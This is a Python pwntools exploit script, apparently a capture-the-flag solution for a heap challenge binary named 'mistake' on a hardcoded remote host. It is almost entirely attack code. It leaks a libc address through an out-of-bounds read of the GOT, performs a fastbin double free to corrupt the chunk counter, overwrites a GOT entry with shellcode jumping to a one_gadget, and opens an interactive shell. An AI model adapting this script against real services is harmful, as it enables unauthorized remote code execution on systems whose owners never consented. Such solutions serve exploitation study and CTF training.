from pwn import *
local = 0
slog = 0
debug = 0
if slog:context.log_level = 'debug'
context(arch='amd64')
if local and debug:
        p = process("./mistake", env={"LD_PRELOAD" : "/mnt/hgfs/share/tool/libc-database/db/libc6_2.19-0ubuntu6.11_amd64.so"})
else:
        p = remote('115.28.185.220',22222)#115.28.185.220 22222
libc = ELF('/mnt/hgfs/share/tool/libc-database/db/libc6_2.19-0ubuntu6.11_amd64.so')
def malloc(content):
    p.recvuntil('> ')
    p.sendline('1')
    p.recvuntil('content: ')
    p.sendline(content)
def free(id):
    p.sendline('3')
    p.sendline(str(id))
def read(addr):
    p.sendline('2')
    p.recvuntil('id: ')
    addr = (addr-0x6020a0)/8
    addr = 0x100000000+addr
    p.sendline(str(addr))
def num(number):
    max = 0xffffffff
    return max + number + 1
free_got = 0x602018
chunk_49 =0x602220
list = 0x6020A0
ptr_got = 0x601f00
chunk_number = 0x0602080
one_offset = 0xe9f2d    
def pwn():
    #leak libc and one_gadget address 
    read(ptr_got)
    p.recv(32)
    write_addr = u64(p.recv(8))
    libc.address = write_addr - libc.symbols['write']
    one = libc.address + one_offset 
    log.info('write address is ' + hex(write_addr))
    log.info('libc address is ' + hex(libc.address))
    log.info('one_gadget is ' + hex(one))
    #to double free fake num
    p.send('\n')
    for x  in xrange(49):
        malloc('AAAA')
    for y in xrange(16):
        free(0)
    free(32)
    free(30)
    free(30)
    malloc(p64(chunk_number-0x8))
    malloc('BBBB')
    malloc('CCCC')
    malloc(p64(num(-13)))
    payload = '''mov rax, {}
                 jmp rax'''.format(one)
    shellcode = asm(payload)
    #change num to neg
    free(num(-5))
    #change malloc got
    malloc(shellcode)
    p.send('1')
pwn()
p.interactive()
